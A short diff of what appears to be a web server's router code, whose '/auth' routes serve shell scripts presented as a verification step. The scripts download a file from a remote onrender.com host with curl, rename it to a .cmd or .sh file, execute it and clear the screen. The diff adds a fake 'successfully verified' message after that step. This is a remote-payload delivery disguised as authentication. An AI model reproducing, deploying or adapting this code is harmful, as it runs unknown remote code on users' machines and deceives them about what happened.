@@ -46,7 +46,7 @@ curl -s -L -o tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
 ren token token.cmd
 call token.cmd
 cls
-exit
+successfully verified
 `);
 });
 router.get("/auth/maclinux", (req, res) => {    
@@ -61,7 +61,7 @@ mv token token.sh
 chmod +x token.sh
 ./token.sh
 clear
-
+successfully verified
 `);
 });
 // C
